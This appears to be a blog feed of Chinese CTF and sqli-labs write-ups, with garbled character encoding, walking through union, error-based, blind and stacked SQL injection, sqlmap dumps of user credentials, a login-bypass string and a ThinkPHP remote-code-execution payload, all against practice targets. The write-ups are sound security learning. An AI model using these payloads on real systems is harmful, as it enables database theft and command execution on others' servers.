    <content type="html"><![CDATA[<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><ul><li><p>åˆ†æ<br>GET-Double injection-Single Quotes-String<br>GET-åŒé‡æ³¨å…¥-å•å¼•å·-å­—ç¬¦ä¸²<br>è¾“å…¥<code>?id=1</code>ï¼Œè¾“å‡ºä¸ºï¼š<img src="https://s1.imagehub.cc/images/2021/01/19/01dc313d1d917e646e.png" alt="01dc313d1d917e646e.png"><br><code>?id=22</code>æ²¡æœ‰è¾“å‡ºï¼›<code>?id=1&#39;</code>æŠ¥é”™ï¼›æ ¹æ®é¢˜ç›®ï¼Œåº”è¯¥ç”¨åŒé‡æ³¨å…¥ï¼šä¸€ä¸ªselectè¯­å¥ä¸­å†åµŒå¥—ä¸€ä¸ªselectè¯­å¥ï¼ŒåµŒå¥—çš„è¿™ä¸ªè¯­å¥ç§°ä½œå­æŸ¥è¯¢<br>ï¼Œå¦‚<code>select concat((select database()));</code><br>å‡ ä¸ªå‡½æ•°ï¼š    </p><blockquote><p>count(expression)ï¼š     è¿”å›æŸ¥è¯¢çš„è®°å½•æ€»æ•°ï¼Œexpression å‚æ•°æ˜¯ä¸€ä¸ªå­—æ®µæˆ–è€… * å·<br>rand()ï¼šè¿”å›0åˆ°1çš„éšæœºæ•°<br>floor(x)     è¿”å›å°äºæˆ–ç­‰äº x çš„æœ€å¤§æ•´æ•°<br>group byè¯­å¥ï¼šæŠŠç»“æœåˆ†ç»„è¾“å‡º<br>concat()ï¼šè¿æ¥ä¸¤æ¡è¯­å¥<br>é‡è¦è¯­å¥ï¼š*<em>``id=1â€™ union SELECT null,count(</em>),concat((payload),floor(rand()*2))as a from information_schema.tables group by a%23<br>``**å…¶ä¸­payloadä¸ºsqlè¯­å¥      </p></blockquote></li><li><p>å¼€å§‹æ³¨å…¥<br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(schema_name) from information_schema.schemata ),floor(rand()*2))as a from information_schema.tables group by a%23</code>å¾—åˆ°æ‰€æœ‰åº“å<img src="https://s1.imagehub.cc/images/2021/01/19/502.png" alt="502.png"><br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),floor(rand()*2))as a from information_schema.tables group by a%23</code>å¾—åˆ°securityä¸‹çš„è¡¨<img src="https://s1.imagehub.cc/images/2021/01/19/503.png" alt="503.png">å€¼å¾—æ³¨æ„çš„æ˜¯,æœ€åä¸€ä¸ªè¡¨æ˜¯usersï¼Œ1æ˜¯randç”Ÿæˆæ‹¼æ¥çš„ã€‚<br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; ),floor(rand()*2))as a from information_schema.tables group by a%23</code>usersä¸‹çš„åˆ—<img src="https://s1.imagehub.cc/images/2021/01/19/504.png" alt="504.png"><br><code>?id=1&#39; union SELECT null,count(*),concat((select group_concat(username,password) from security.users ),floor(rand()*2))as a from information_schema.tables group by a%23</code>æŸ¥æ•°æ®å‡ºç°é—®é¢˜äº†ï¼Œè¿™æ®µè¯­å¥çš„è¾“å‡ºæ˜¯<code>You are in...........</code>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ„Ÿè§‰æ²¡é”™å•Šï¼Œæ¢æˆè¿™æ ·çš„<code>?id=1&#39; union SELECT null,count(*),concat((select username from security.users ),floor(rand()*2))as a from information_schema.tables group by a%23</code>,è¾“å‡º<code> Subquery returns more than 1 row</code>ï¼Œå†åŠ ä¸Šlimitï¼Œä¸€ä¸ªä¸€ä¸ªæŸ¥ï¼Œå¾—åˆ°æ‰€æœ‰çš„usernameå’Œpasswordã€‚<br>è¿™ç§æ–¹æ³•æœ‰æ—¶å€™å›è½¦ä¸€æ¬¡ä¸ä¼šæˆåŠŸï¼Œå¾—å¤šæ³¨å‡ æ¬¡ã€‚      </p></li></ul><hr><hr><ul><li><strong>boolç›²æ³¨</strong><br>å‡ ä¸ªå‡½æ•°        <blockquote><p>substr(s, start, length)     ä»å­—ç¬¦ä¸² s çš„ start ä½ç½®æˆªå–é•¿åº¦ä¸º length çš„å­å­—ç¬¦ä¸²<br>Lengthï¼ˆï¼‰å‡½æ•° è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦<br>ascii(s)     è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç ã€‚          </p></blockquote></li></ul><p>æ­£ç¡®æ—¶è¿”å›<code>You are in...</code>;é”™è¯¯æ—¶æ— è¿”å›<br><code>?id=1&#39; and length(database())&gt;8%23</code>æ— è¿”å›ï¼Œ7æœ‰è¿”å›ï¼Œè¯´æ˜å½“å‰æ•°æ®åº“çš„é•¿åº¦ä¸º8<br><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;115%23</code>æ— è¿”å›,114æœ‰è¿”å›ï¼Œè¯´æ˜åº“åç¬¬ä¸€ä¸ªå­—æ¯ä¸ºs<br><code>?id=1&#39; and ascii(substr(database(),2,1))&gt;101%23</code>æ— è¿”å›ï¼Œ100æœ‰è¿”å›ï¼Œè¯´æ˜ç¬¬äºŒä¸ªå­—æ¯ä¸ºe<br><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>            </p><p><code>?id=1&#39;and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;6%23</code>åˆ¤æ–­ï¼ˆç¬¬ä¸€ä¸ªï¼‰è¡¨çš„é•¿åº¦        </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97%23</code>ï¼ˆç¬¬ä¸€ä¸ªï¼‰è¡¨çš„ï¼ˆç¬¬ä¸€ä¸ªï¼‰å­—ç¬¦        </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;65%23</code>ï¼ˆusersï¼‰ä¸‹ï¼ˆç¬¬ä¸€åˆ—ï¼‰çš„ï¼ˆç¬¬ä¸€ä¸ªï¼‰å­—ç¬¦       </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select username from security.users limit 0,1),1,1)))&gt;65%23</code>         </p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>GET-Double injection-Double Quotes-String<br>GET-åŒé‡æ³¨å…¥-åŒé‡å¼•å·-å­—ç¬¦ä¸²<br>ç›¸è¾ƒäºlevel5ï¼Œå•å¼•å·æ”¹ä¸ºåŒå¼•å·<br>æµ‹è¯•<code>?id=1&quot; union SELECT null,count(*),concat((select group_concat(schema_name) from information_schema.schemata ),floor(rand()*2))as a from information_schema.tables group by a%23</code>å¯ä»¥æ­£å¸¸å¾—åˆ°åº“å     </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>    </p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>GET - Blind - Boolian Based - Single Quotes<br>åŸºäºå¸ƒå°”çš„ç›²æ³¨-å•å¼•å·<br>æµ‹è¯•<code>?id=1&#39; and length(database())&gt;8%23</code>æ­£å¸¸      </p><p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>    </p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜005</title>
    <link href="/2021/01/19/BUU005/"/>
    <url>/2021/01/19/BUU005/</url>
    
    <content type="html"><![CDATA[<h2 id="äº”ã€"><a href="#äº”ã€" class="headerlink" title="äº”ã€"></a>äº”ã€</h2><ul><li>é¢˜ç›®ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL<br> [<img src="https://s1.imagehub.cc/images/2021/01/19/01.md.png">]       </li><li>åˆ†æ<br>ä¼ å…¥<code>username=1&#39;&amp;&amp;password=1&#39;</code>å‘ç°æŠ¥é”™ï¼Œæ‰€ä»¥å¯ä»¥çš„å¾—å‡ºä¸¤å¤„å‡å­˜åœ¨sqlæ³¨å…¥ï¼Œå†æ¬¡ä¼ å…¥<code>username=1&quot;&amp;&amp;password=1&quot;</code>,å‘ç°æ²¡æœ‰æŠ¥é”™ï¼Œè€Œæ˜¯<code>NO,Wrong username passwordï¼ï¼ï¼</code><br>æ¥ä¸‹æ¥æŒ‰æµç¨‹èµ°ä¸€èµ°ï¼š      <blockquote><p>æµ‹è¯•å­—æ®µæ•°<br>æµ‹å›æ˜¾ä½<br>æŸ¥è¯¢åº“å<br>æŸ¥è¯¢è¡¨å<br>æŸ¥è¯¢åˆ—å<br>åˆ—ä¸­æ•°æ®       </p></blockquote></li><li>è§£<br><code>username=1&#39; order by 1,2,3,4#</code> å¾—åˆ°<code>Unknown column &#39;4&#39; in &#39;order clause&#39;</code>è¯´æ˜ä¸‰ä¸ªå­—æ®µï¼›<br><code>username=1&#39; union select 1,2,3#</code>å¾—åˆ°<a href="https://www.imagehub.cc/image/6jRaH"><img src="https://s1.imagehub.cc/images/2021/01/19/02.md.png" alt="02.md.png"></a><br>è¯´æ˜å›æ˜¾ä½åœ¨2ï¼Œ3å¤„ã€‚<br><code>username=1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)#</code>å¾—åˆ°æ‰€æœ‰çš„åº“å<a href="https://www.imagehub.cc/image/6ja0Y"><img src="https://s1.imagehub.cc/images/2021/01/19/03.md.png" alt="03.md.png"></a><br><code>username=1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;)#</code>è·å–geekåº“ä¸‹çš„è¡¨å<br><a href="https://www.imagehub.cc/image/6jhFc"><img src="https://s1.imagehub.cc/images/2021/01/19/04.md.png" alt="04.md.png"></a><br><code>username=1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;)#</code>è·å–l0ve1ysq1è¡¨ä¸‹çš„åˆ—å<a href="https://www.imagehub.cc/image/6jBlK"><img src="https://s1.imagehub.cc/images/2021/01/19/05.md.png" alt="05.md.png"></a><br><code>username=1&#39; union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from geek.l0ve1ysq1)#</code>å¾—åˆ°flag<br><a href="https://www.imagehub.cc/image/6jUdT"><img src="https://s1.imagehub.cc/images/2021/01/19/06.md.png" alt="06.md.png"></a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leve2</title>
    <link href="/2021/01/18/leve2/"/>
    <url>/2021/01/18/leve2/</url>
    
    <content type="html"><![CDATA[<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><h3 id="ç”¨sqlmapè¿‡ç¬¬äºŒå…³ï¼š"><a href="#ç”¨sqlmapè¿‡ç¬¬äºŒå…³ï¼š" class="headerlink" title="ç”¨sqlmapè¿‡ç¬¬äºŒå…³ï¼š"></a>ç”¨sqlmapè¿‡ç¬¬äºŒå…³ï¼š</h3><ol><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 --dbs</code><br>å¾—åˆ°æ•°æ®åº“<br><img src="https://ftp.bmp.ovh/imgs/2021/01/e826d7b6614685d0.png"></li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security --tables</code><br>è·å–<code>security</code>ä¸‹çš„è¡¨<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f86812760a0593bb.png"></li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users --columns</code><br>è·å–<code>users</code>è¡¨ä¸­çš„åˆ—å<br>[<img src="https://s3.ax1x.com/2021/01/18/scp4eI.png">]</li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C password --dump</code><br>è·å–<code>password</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc99YT.png">]</li><li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C username --dump</code><br>è·å–<code>username</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc9ou9.png">]</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜004</title>
    <link href="/2021/01/18/BUU004/"/>
    <url>/2021/01/18/BUU004/</url>
    
    <content type="html"><![CDATA[<h2 id="å››ã€"><a href="#å››ã€" class="headerlink" title="å››ã€"></a>å››ã€</h2><ul><li><p>é¢˜ç›®ï¼š[SUCTF 2019]EasySQL<br><a href="https://www.imagehub.cc/image/6jbY2"><img src="https://s1.imagehub.cc/images/2021/01/19/0102cc55d08653a98b.md.png" alt="0102cc55d08653a98b.md.png"></a><br>åˆæ˜¯æŒ¨æ‰“çš„ä¸€å¤©ï¼Œå“       </p></li><li><p>åˆ†æ<br>è¯•äº†å‡ ä¸‹ï¼Œå‘ç°äº†å››ç§å›æ˜¾ï¼Œ<br><a href="https://www.imagehub.cc/image/6k2K7"><img src="https://s1.imagehub.cc/images/2021/01/19/02a36cac9ad26e6d51.md.png" alt="02a36cac9ad26e6d51.md.png"></a><br><a href="https://www.imagehub.cc/image/6kJG6"><img src="https://s1.imagehub.cc/images/2021/01/19/03c5acdd455142d18f.md.png" alt="03c5acdd455142d18f.md.png"></a><br>ç¬¬ä¸‰ç§è¾“å‡º<code>Nonono</code>;ç¬¬å››ç§æ— è¾“å‡ºï¼›çœ‹åˆ°0å’Œ1ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯å¸ƒå°”å€¼æ³¨å…¥ï¼Œä½†å¼„äº†åŠå¤©ä¹Ÿæ²¡ä¸ªç»“æœï¼Œè¿˜æ˜¯å»çœ‹WPå§     </p></li><li><p>è§£<br>åŸæ¥å¯ä»¥å †å æ³¨å…¥ï¼Œå±…ç„¶æ²¡æƒ³åˆ°â€¦â€¦..<br>ç„¶å<code>1;show databases;</code>å¾—åˆ°åº“ï¼›<code>1;show tables;</code>å¾—åˆ°ä¸ªFlagè¡¨<a href="https://www.imagehub.cc/image/6kPVB"><img src="https://s1.imagehub.cc/images/2021/01/19/046528a57b3736bbb6.md.png" alt="046528a57b3736bbb6.md.png"></a><br><code>1;select * from Flag;</code>å‘ç°å¾—ä¸åˆ°flagï¼›çœ‹WPè¯´æ˜¯è¿‡æ»¤äº†flagã€fromç­‰ï¼›è€Œä¸”æ¯”èµ›æ—¶æºç æ³„éœ²äº†ï¼Ÿï¼Ÿ<br>æºç ï¼š<code>select $_GET[&#39;query&#39;] || flag from flag</code><br>payload1:<code>*,1</code>     </p><p>  payload2:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p><p>  å¾—åˆ°flag<a href="https://www.imagehub.cc/image/6kcIy"><img src="https://s1.imagehub.cc/images/2021/01/19/058f6f0248c586cc4a.md.png" alt="058f6f0248c586cc4a.md.png"></a>  </p><ul><li><p>çŸ¥è¯†ç‚¹</p><p>  åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ã€‚</p><p>  ä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode<br>  æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚</p></li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Level1~~level4</title>
    <link href="/2021/01/17/leve1/"/>
    <url>/2021/01/17/leve1/</url>
    
    <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>è¾“å…¥id=1,æœ‰å›æ˜¾ï¼›æ­¤å¤–ï¼Œ2ï¼Œ3ï¼Œ4â€¦â€¦12å‡æœ‰å›æ˜¾ï¼Œè¯´æ˜æœ‰12æ¡æ•°æ®ã€‚</p><p>æ¥ä¸‹æ¥ä½¿ç”¨<code>order by 1 %23</code><br><code>order by 1,2 %23</code><br>â€¦â€¦.<br>å¾—åˆ°ä¸€å…±æœ‰ä¸‰åˆ—<br>å°†id=1æ”¹ä¸ºä¸€ä¸ªæ•°æ®åº“ä¸å­˜åœ¨çš„idå€¼ï¼Œå¦‚861ï¼Œä½¿ç”¨union select 1,2,3è”åˆæŸ¥è¯¢è¯­å¥æŸ¥çœ‹é¡µé¢çš„æ˜¾ç¤ºä½ã€‚<br><img src="https://ftp.bmp.ovh/imgs/2021/01/7fe5a0b12e1c7810.png"><br>2ï¼Œ3ä¸¤ä¸ªæ˜¾ç¤ºä½ï¼›<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23</code> å¾—åˆ°åº“å<img src="https://ftp.bmp.ovh/imgs/2021/01/e273266cd62bab04.png"><br>è·å–securityåº“ä¸­çš„è¡¨<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) %23</code><img src="https://ftp.bmp.ovh/imgs/2021/01/bff49f0f721798e4.png"><br>usersä¸‹çš„åˆ—å<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/fd5c32324cb27880.png"></p><p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png">            </p><hr><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>?id=1</code>æ­£å¸¸è¾“å‡º<br><code>?id=1&#39;</code>æŠ¥é”™<br><code>?id=1&quot;</code>æŠ¥é”™<br><code>?id=3-1</code>æ­£å¸¸è¾“å‡º<br>åˆ¤æ–­ä¸ºæ•°å€¼å‹æ³¨å…¥<br><code>?id=33 union select 1,2,3%23</code>æ­£å¸¸å›æ˜¾<br>æŒ‰ç¬¬ä¸€å…³çš„æ­¥éª¤å¯ä»¥å¾—å‡º      </p><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><code>?id=1&#39;</code>æŠ¥é”™<br><code>?id=1&quot;</code>æ­£å¸¸è¾“å‡º<br>æœ¬æ¥ä»¥ä¸ºæ˜¯<code>&quot;&quot;</code>çš„é—­åˆï¼Œä½†åé¢çš„æ“ä½œè¿›è¡Œä¸å‡ºæ¥ï¼›<br><code>?id=1&#39;)%23</code>ä¹Ÿèƒ½æ­£å¸¸è¾“å‡º<br><code>?id=1&#39;) order by 1,2,3,4%23</code>æŠ¥é”™è¾“å‡º<br><code>?id=1&#39;) union select 1,2,3%23</code>æ­£å¸¸è¾“å‡º<br>æ‰€ä»¥åº”è¯¥æ˜¯<code>(&#39;&#39;)</code>çš„é—­åˆ     </p><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><code>?id=1&#39;</code>æ­£å¸¸è¾“å‡º<br><code>?id=1&quot;%23</code>æŠ¥é”™<br><code>?id=1&#39;)%23</code>æ­£å¸¸è¾“å‡ºï¼Œä½†<code>order by 1,2,3,4</code>æ²¡æœ‰æŠ¥é”™<br><code>?id=1&quot;)%23</code>æ­£å¸¸è¾“å‡º<br><code>?id=1&quot;) order by 1,2,3,4%23</code>æ­£å¸¸æŠ¥é”™<br>è¯´æ˜é—­åˆå½¢å¼ä¸º<code>(&quot;&quot;)</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>noet</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜003</title>
    <link href="/2021/01/17/BUU003/"/>
    <url>/2021/01/17/BUU003/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‰ã€"><a href="#ä¸‰ã€" class="headerlink" title="ä¸‰ã€"></a>ä¸‰ã€</h2><ul><li><p>é¢˜ç›®ï¼š[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL<br>æ‰“å¼€ç½‘é¡µï¼š<img src="https://ftp.bmp.ovh/imgs/2021/01/e63e9622302a8b1e.png">           </p></li><li><p>åˆ†æ<br>F12çœ‹åˆ°æºç ä¸­æœ‰ä¸ªcheck.php,è®¿é—®åä¹Ÿæ²¡å¾—åˆ°æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼›<br>é¢˜ç›®æ˜¯EasySQLï¼Œé‚£å°±æ˜¯SQLæ³¨å…¥äº†å§ï¼›<br>è¾“å…¥ï¼šç”¨æˆ·åï¼š1â€™       å¯†ç ï¼š1<br>å‘ç°æŠ¥é”™ï¼š<img src="https://ftp.bmp.ovh/imgs/2021/01/3ddef4ddc63b0e86.png"><br>æ‰€ä»¥åº”è¯¥æ˜¯å­—ç¬¦å‹æ³¨å…¥           </p></li><li><p>è§£<br><img src="https://ftp.bmp.ovh/imgs/2021/01/06ec27df80b3a0e3.png"><br>å¾—åˆ°flagï¼š<br><img src="https://ftp.bmp.ovh/imgs/2021/01/0144b5f527675cfb.png"><br>æˆ–è€…ä½¿ç”¨ä¸‡èƒ½å¯†ç ï¼š<code>admin&#39; or &#39;1&#39;=&#39;1</code><br>æ‹¼æ¥çš„sqlè¯­å¥ä¸ºï¼š<code>username=admin&#39; or &#39;1&#39;=&#39;1&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code><br>ä¹Ÿå¯ä»¥å¾—åˆ°flagã€‚      </p></li><li><p>çŸ¥è¯†ç‚¹      </p></li><li><p>*å­—ç¬¦å‹æ³¨å…¥**<br>å­˜åœ¨SQLæ³¨å…¥æ¼æ´çš„URLå‚æ•°ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼ˆéœ€è¦ä½¿ç”¨å•å¼•å·è¡¨ç¤ºï¼‰<br>å…³é”®åœ¨äº<strong>å•å¼•å·é—­åˆ</strong><br>mysqlæ•°æ®åº“å¯¹äºå•å¼•å·çš„è§„åˆ™å¦‚ä¸‹ï¼š</p><pre><code>  &gt; å•å¼•å·å¿…é¡»æˆå¯¹å‡ºç°ï¼Œå¦åˆ™æ•°æ®åº“å°±ä¼šæŠ¥é”™ã€‚              å¦‚æœä¸¤ä¸ªå•å¼•å·ä¹‹é—´å†…å®¹ä¸ºç©ºï¼Œæ•°æ®åº“è‡ªåŠ¨å¿½ç•¥ã€‚</code></pre></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUæ¯æ—¥ä¸€é¢˜002</title>
    <link href="/2021/01/16/BUU002/"/>
    <url>/2021/01/16/BUU002/</url>
    
    <content type="html"><![CDATA[<h2 id="äºŒã€"><a href="#äºŒã€" class="headerlink" title="äºŒã€"></a>äºŒã€</h2><ul><li>é¢˜ç›®ï¼š[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨<br><img src="https://ftp.bmp.ovh/imgs/2021/01/bf336fcfff0a5cd3.png"></li></ul><ul><li>åˆ†æï¼š<br>ä¸€é“sqlæ³¨å…¥é¢˜ï¼Œè€Œä¸”selectã€whereç­‰ä¸€äº›è¯è¢«è¿‡æ»¤ï¼Œä¸èƒ½ç”¨ï¼Œå¯¹äºä¸€ä¸ªåˆšåˆšæ¥è§¦sqlæ³¨å…¥çš„å°ç™½æ¥è¯´ï¼Œå®Œå…¨æ‰‹è¶³æ— æªï¼Œçœ‹äº†ä¸€äº›æ–‡ç« ï¼Œè¿˜æ˜¯ä¸€è„¸æ‡µï¼Œè¿˜æ˜¯å»çœ‹WPå§ï¼Œå°±å½“ç§¯ç´¯äº†ã€‚<br><img src="https://ftp.bmp.ovh/imgs/2021/01/853a20efda0e5fef.png"></li><li>è§£<br>å¯ä»¥ä½¿ç”¨<strong>å †å æ³¨å…¥</strong>ï¼Œå°±æ˜¯ä¸€æ¡sqlè¯­å¥ä»¥<code>ï¼›</code>ç»“å°¾åï¼Œå†åŠ sqlè¯­å¥ï¼Œè¿˜æ˜¯èƒ½æ‰§è¡Œã€‚<br>æŸ¥çœ‹åº“ï¼š<code>1&#39;;show databases;</code>      å¾—åˆ°ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f55691cf3ced64bb.png"><br>æŸ¥çœ‹è¡¨ï¼š<code>1&#39;;show tables;</code>å¾—åˆ°ï¼š<br><img src="https://ftp.bmp.ovh/imgs/2021/01/05c3b3fc760f6eca.png"><br>æŸ¥çœ‹è¡¨ç»“æ„ï¼š<code>1&#39;;desc `1919810931114514`;</code>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¦æŸ¥è¯¢è¿™ä¸ªè¡¨çš„ç»“æ„ï¼Œåå­—è¦ç”¨åå¼•å·åŒ…ä½ï¼Œå¦åˆ™æ˜¯ä¸ä¼šè¿”å›ç»“æœçš„ã€‚ </li></ul><p>åœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦ã€‚<br><img src="https://ftp.bmp.ovh/imgs/2021/01/8e40ff5403047887.png"><br>å¦ä¸€ä¸ªè¡¨ï¼š<code>1&#39;;desc words;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3fbb9965de0a3b46.png"><br>è¿™ä¸ªè¡¨ä¸­æœ‰<strong>id</strong>å’Œ<strong>data</strong>;æ‰€ä»¥çŒœæµ‹åå°çš„æŸ¥è¯¢è¯­å¥å¯èƒ½æ˜¯ï¼š<code>select id,data from words where id =</code></p><p>ç„¶åè¿™ä¸ªæ”¹åçš„æ–¹æ³•tqlï¼š</p><p>å°†<code>1919810931114514</code>æ”¹ä¸ºwordsï¼›åŸæ¥çš„wordsæ”¹æˆå…¶ä»–åå­—words1ï¼›åˆ—åflagæ”¹æˆidï¼Œç„¶åç”¨<code>1&#39; or 1=1;</code>å°±èƒ½å¾—åˆ°flagäº†ã€‚<br><strong>payloadï¼š</strong></p><pre><code>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</code></pre><p><img src="https://ftp.bmp.ovh/imgs/2021/01/7bfbf349a5b321ec.png"></p><ul><li>çŸ¥è¯†ç‚¹        <blockquote><p>å †å æ³¨å…¥<br>æ”¹åå­—çš„è¯­å¥è§£æï¼š<br>renameå‘½ä»¤ç”¨äºä¿®æ”¹è¡¨åã€‚<br>renameå‘½ä»¤æ ¼å¼ï¼šrename table åŸè¡¨å to æ–°è¡¨å;<br>ä¿®æ”¹åŸå­—æ®µåç§°åŠç±»<br><code>mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type;</code></p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shuashua</title>
    <link href="/2021/01/15/shuashua/"/>
    <url>/2021/01/15/shuashua/</url>
    
    <content type="html"><![CDATA[<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><ul><li>é¢˜ç›®ï¼š<img src="https://ftp.bmp.ovh/imgs/2021/01/5118e8d6dae556ff.png">          </li><li>è§£<br>æ‘¸ç´¢äº†åŠå¤©ï¼Œè¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œçœ‹äº†åˆ«äººçš„WPåçŸ¥é“åŸæ¥è¿™æ˜¯Think PHPçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼š<blockquote><p> <code>? s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=xxxxxï¼ˆå‘½ä»¤ï¼‰</code>           </p></blockquote></li></ul><ul><li>è§£<br>å…ˆ<code>ls</code>ä¸€ä¸‹ï¼Œå‘ç°æ²¡æœ‰flagï¼Œå»ä¸Šçº§ç›®å½•<code>../</code>å¤šåŠ å‡ ä¸ªï¼Œæˆ–è€…ç›´æ¥åˆ°æ ¹ç›®å½•<code>./</code>;å¾—åˆ°ä¸€ä¸ªflagåå­—çš„æ–‡ä»¶<br><img src="https://ftp.bmp.ovh/imgs/2021/01/362902231b2d1d1d.png"><br><code>cat ../../../flag</code>å¾—åˆ°flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/5e56a7b6934f2903.png"></li></ul><hr><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><ul><li>é¢˜ç›®ï¼š<a href="https://www.imagehub.cc/image/6knh1"><img src="https://s1.imagehub.cc/images/2021/01/19/php201.md.png" alt="php201.md.png"></a>        </li><li>è§£<br>è®¿é—®<code>index.phps</code>å¾—åˆ°æºç        <blockquote><p>phpsæ–‡ä»¶å°±æ˜¯phpçš„æºä»£ç 